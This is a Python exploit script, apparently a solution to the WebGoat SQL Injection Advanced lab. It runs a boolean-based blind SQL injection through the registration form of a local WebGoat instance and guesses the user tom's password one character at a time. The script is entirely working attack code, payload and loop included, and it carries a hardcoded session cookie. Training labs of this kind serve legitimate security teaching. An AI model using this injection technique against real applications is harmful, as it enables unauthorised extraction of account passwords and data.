import json  
import requests  
  
def sql_injection_advance_5():  
        alphabet_index = 0  
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'  
        password_index = 0  
        password = ''  

        headers = {  
        'Cookie': 'JSESSIONID=tAeN1BcC2UYheEhBFKrz60GVhDAPfYsbkqJSA7vm',  
        }  

        while True:  
                payload = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'
                print(alphabet[alphabet_index])

                data = {  
                'username_reg': payload,  
                'email_reg': '1@1',  
                'password_reg': '1',  
                'confirm_password_reg': '1'  
                }  

                r = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
                response = json.loads(r.text)

                if "already exists" in response['feedback']:  
                        password += alphabet[alphabet_index]  
                        print(password)  
                        alphabet_index = 0  
                        password_index += 1  
                else:  
                        alphabet_index += 1  
                        if alphabet_index > len(alphabet) - 1:  
                                return  

  
sql_injection_advance_5()